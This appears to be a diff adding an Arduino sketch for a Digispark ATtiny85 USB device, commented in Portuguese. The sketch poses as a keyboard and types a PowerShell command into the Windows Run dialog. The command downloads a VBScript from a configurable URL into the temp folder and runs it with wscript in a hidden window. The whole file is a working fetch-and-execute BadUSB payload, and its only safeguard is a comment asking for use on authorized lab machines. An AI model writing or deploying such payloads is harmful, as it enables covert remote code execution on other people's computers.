@@ -1,0 +1,64 @@
+// digispark_fetch_and_run_vbs.ino
+// Digispark (ATtiny85) - baixa um .vbs e executa via wscript (Windows)
+// Use apenas em máquinas de teste/ laboratório autorizadas.
+
+#include "DigiKeyboard.h"
+
+// ========== CONFIG ==========
+const char SCRIPT_URL[] = "https://example.com/meu_script.vbs"; // <- troque aqui
+const char OUT_NAME[]   = "meu_script.vbs";                    // <- troque aqui
+// ============================
+
+// Digita uma string com delays (melhora compatibilidade com hosts lentos/layouts)
+void typeString(const char *s, unsigned int interCharDelay = 8) {
+  for (const char *p = s; *p; ++p) {
+    // estabilidade: enviar um "no key" para evitar perda de char em alguns hosts
+    DigiKeyboard.sendKeyStroke(0);
+    DigiKeyboard.printChar(*p);
+    DigiKeyboard.delay(interCharDelay);
+  }
+}
+
+void setup() {
+  // espera enumeration do USB
+  DigiKeyboard.delay(800);
+
+  // 1) abrir Run
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
+  DigiKeyboard.delay(500);
+
+  // 2) montar comando PowerShell:
+  // Comando final (exemplo): 
+  // powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest 'https://...' -OutFile $env:TEMP\\meu_script.vbs; Start-Process wscript -ArgumentList \"$env:TEMP\\meu_script.vbs\""
+  //
+  // Observações:
+  // - usamos aspas duplas ao redor do -Command para permitir expansão de $env:TEMP
+  // - escapamos as aspas internas para o ArgumentList
+
+  const char *prefix  = "powershell -NoProfile -WindowStyle Hidden -Command \"Invoke-WebRequest '";
+  const char *mid1    = "' -OutFile $env:TEMP\\\\";
+  const char *mid2    = "; Start-Process wscript -ArgumentList \\\"$env:TEMP\\\\";
+  const char *suffix  = "\\\"\"";
+
+  // digita cada parte (atenção: backslashes duplos são necessários para que o Powershell receba um único '\')
+  typeString(prefix, 7);
+  typeString(SCRIPT_URL, 7);
+  typeString(mid1, 7);
+  typeString(OUT_NAME, 7);
+  typeString(mid2, 7);
+  typeString(OUT_NAME, 7);
+  typeString(suffix, 7);
+
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // executa o comando
+  DigiKeyboard.delay(300);
+
+  // opcional: fecha qualquer pop-up (não obrigatório)
+  // DigiKeyboard.sendKeyStroke(KEY_ESCAPE);
+
+  // fim: não repetir
+}
+
+void loop() {
+  // nada
+}
